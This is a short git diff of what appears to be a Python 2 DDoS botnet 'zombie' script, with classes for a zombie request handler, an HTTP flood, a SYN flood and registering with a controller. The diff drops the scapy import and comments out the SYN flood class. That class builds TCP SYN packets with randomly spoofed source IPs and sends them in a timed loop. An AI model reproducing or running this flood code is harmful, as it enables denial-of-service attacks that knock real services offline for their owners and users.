@@ -5,7 +5,6 @@ import socket
 import urllib2
 import random
 import os
-import scapy
 
 class zombie(SocketServer.BaseRequestHandler):
     def handle(self):
@@ -52,6 +51,7 @@ class attackHTTPFlood(threading.Thread):
             except IOError:
                 print "Could not open ", self.target
 
+"""
 class attackSYNFlood(threading.Thread):
     def __init__(self, **kwargs):
         threading.Thread.__init__(self)
@@ -62,7 +62,7 @@ class attackSYNFlood(threading.Thread):
     def run(self):
         start = time.time()
         while time.time() - start < self.timeout:
-            ip = scapy.IP()
+            ip = IP()
             ip.src = "{0}.{1}.{2}.{3}".format(random.randint(1,254),
                                      random.randint(1,254),
                                      random.randint(1,254),
@@ -75,6 +75,7 @@ class attackSYNFlood(threading.Thread):
             tcp.flags = 'S'
 
             send(ip/tcp, verbose = 0)
+"""
 
 class registerIP(threading.Thread):
     def __init__(self, HOST, PORT):
